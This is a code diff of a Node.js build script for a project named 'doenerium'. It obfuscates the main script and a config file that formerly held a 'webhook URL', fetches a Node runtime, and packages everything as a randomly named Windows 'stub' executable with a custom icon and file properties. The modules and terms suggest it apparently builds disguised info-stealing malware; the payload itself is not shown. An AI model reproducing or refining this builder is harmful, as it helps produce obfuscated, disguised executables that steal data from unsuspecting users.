@@ -2,12 +2,20 @@ const jsconfuser = require('js-confuser');
 const jsobf = require("javascript-obfuscator");
 const fs = require("fs");
 const child_process = require("child_process");
+const os = require("os");
+const https = require('https');
+const exe = require('@angablue/exe');
+const config = require("./config.js")()
+
 
 async function install_node_gyp() {
     return new Promise(res => {
         res(child_process.execSync("npm install -g node-gyp"))
     })
 }
+
+let result = '';
+
 
 var isModuleAvailableSync = function (moduleName) {
     var ret = false; // return value, boolean
@@ -52,7 +60,7 @@ async function check_all_modules_installed() {
             "sqlite3",
             "systeminformation",
             "zip-lib"
-        ].forEach(async(moduleName) => {
+        ].forEach(async (moduleName) => {
             if (!isModuleAvailableSync(moduleName)) {
                 console.log(`Installing "${moduleName}" as it is not installed`)
                 await install_module(moduleName)
@@ -167,7 +175,7 @@ async function obfuscate(input, output) {
                             require("form-data");
                             require("buffer-replace");
                             require("axios");
-                            require("./webhook_obf.js");
+                            require("./config_obf.js");
                             `
 
             res(fs.writeFileSync(output, modules + obfuscated));
@@ -175,10 +183,75 @@ async function obfuscate(input, output) {
 
         })
     })
+}
+
+/**
+ * Download a resource from `url` to `dest`.
+ * @param {string} url - Valid URL to attempt download of resource
+ * @param {string} dest - Valid path to save the file.
+ * @returns {Promise<void>} - Returns asynchronously when successfully completed download
+ */
+function download(url, dest) {
+    return new Promise((resolve, reject) => {
+        // Check file does not exist yet before hitting network
+        fs.access(dest, fs.constants.F_OK, async (err) => {
+
+            if (err === null) {
+                fs.unlinkSync(dest)
+                resolve(await download(url, dest))
+            }
+
+            const request = https.get(url, response => {
+                if (response.statusCode === 200) {
+
+                    const file = fs.createWriteStream(dest, { flags: 'wx' });
+                    file.on('finish', () => resolve());
+                    file.on('error', async err => {
+                        file.close();
+                        if (err.code === 'EEXIST') {
+                            fs.unlinkSync(dest)
+                            resolve(await download(url, dest))
+                        }
+                        else { fs.unlink(dest, () => reject(err.message)) }; // Delete temp file
+                    });
+                    response.pipe(file);
+                } else if (response.statusCode === 302 || response.statusCode === 301) {
+                    //Recursively follow redirects, only a 200 will resolve.
+                    download(response.headers.location, dest).then(() => resolve());
+                } else {
+                    reject(`Server responded with ${response.statusCode}: ${response.statusMessage}`);
+                }
+            });
+
+            request.on('error', err => {
+                reject(err.message);
+            });
+        });
+    });
+}
+async function rebuild_node_gyp() {
 
 }
 
+function get_pkg_cache() {
+    const pkg_cache_path = `${process.env.SystemDrive}\\Users\\${os.userInfo().username}\\.pkg-cache`;
+
+    if (!fs.existsSync(pkg_cache_path)) {
+        fs.mkdirSync(pkg_cache_path)
+        fs.mkdirSync(`${pkg_cache_path}\\v3.4`)
+    }
+
+    return `${pkg_cache_path}\\v3.4`;
+}
+
 (async () => {
+
+
+    console.log("Downloading Node.js pre-built binary")
+    let start = Date.now()
+    await download("https://github.com/vercel/pkg-fetch/releases/download/v3.5/node-v18.15.0-win-x64", `${get_pkg_cache()}\\built-v18.5.0-win-x64`)
+    console.log(`Downloaded Node.js pre-built binary within ${(Date.now() - start) / 1000} seconds`);
+
 
     console.log("Checking if all modules are installed")
     await check_all_modules_installed();
@@ -190,25 +263,32 @@ async function obfuscate(input, output) {
 
     const index_file = "index.js";
     console.log(`Obfuscating source code`)
-    let start = Date.now()
+    start = Date.now()
     await obfuscate("doenerium.js", index_file);
     console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${index_file}`);
-    console.log(`Obfuscating webhook URL`)
+    console.log(`Obfuscating config URL`)
     start = Date.now()
-    await obfuscate("webhook.js", "webhook_obf.js");
-    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: webhook_obf.js`);
-    
+    await obfuscate("config.js", "config_obf.js");
+    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: config_obf.js`);
+
     console.log(`Building stub...`)
-    
+
     let randomid = makeid(8)
     start = Date.now()
-    child_process.execSync(`pkg . -C GZip -t node18-win-x64 -o doenerium_${randomid}.exe`)
+    const build = await exe({
+        entry: '.',
+        out: `./doenerium_${randomid}.exe`,
+        icon: config.icon,
+        target: 'node18-win-x64',
+        pkg: ['-C', 'GZip'],
+        properties: config.properties
+    })
+
+    //child_process.execSync(`pkg . -C GZip -t node18 -o doenerium_${randomid}.exe`)
     fs.unlinkSync(index_file);
-    fs.unlinkSync("webhook_obf.js");
+    fs.unlinkSync("config_obf.js");
 
     console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)
-    console.log(`You can now close this tab.`)
-    
-    
-    while (true) {}
+
+    while (true) { }
 })()
